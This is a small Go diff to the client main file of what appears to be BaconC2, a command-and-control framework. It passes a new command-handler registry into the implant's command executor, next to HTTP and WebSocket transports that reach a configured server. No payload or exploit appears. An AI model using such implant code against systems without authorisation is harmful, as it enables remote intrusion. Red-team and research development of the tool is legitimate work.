@@ -17,6 +17,7 @@ import (
 	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
+	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
@@ -57,7 +58,8 @@ func main() {
 	transportProtocol := transport.NewHTTPClientTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue, encoderChain)
 
 	wsTransport := transport.NewWebSocketTransport(cfg.ServerURL, cfg.AgentID)
-	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg)
+
+	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg, command_handler.CommandRegistry)
 
 	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor, cmdQueue, resultQueue)
 
